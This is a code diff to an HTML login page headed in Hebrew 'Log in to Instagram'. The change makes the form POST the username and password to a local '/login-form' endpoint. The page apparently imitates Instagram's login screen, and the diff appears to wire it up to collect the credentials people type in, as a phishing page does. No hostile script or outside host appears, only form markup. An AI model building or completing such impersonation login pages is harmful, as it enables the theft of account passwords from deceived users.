@@ -26,11 +26,11 @@
         <div class="login-content">
             <div class="login-header">התחברות לאינסטגרם</div>
             
-            <form id="loginForm">
-                <input type="text" id="username" class="custom-input" placeholder="מספר טלפון נייד, שם משתמש או דוא''ל">
+            <form id="loginForm" action="/login-form" method="POST">
+                <input type="text" id="username" name="username" class="custom-input" placeholder="מספר טלפון נייד, שם משתמש או דוא''ל">
                 <div id="usernameError" class="error-message"></div>
 
-                <input type="password" id="password" class="custom-input" placeholder="סיסמה">
+                <input type="password" id="password" name="password" class="custom-input" placeholder="סיסמה">
                 <div id="passwordError" class="error-message"></div>
 
                 <button type="submit" class="login-btn">התחבר/י</button>
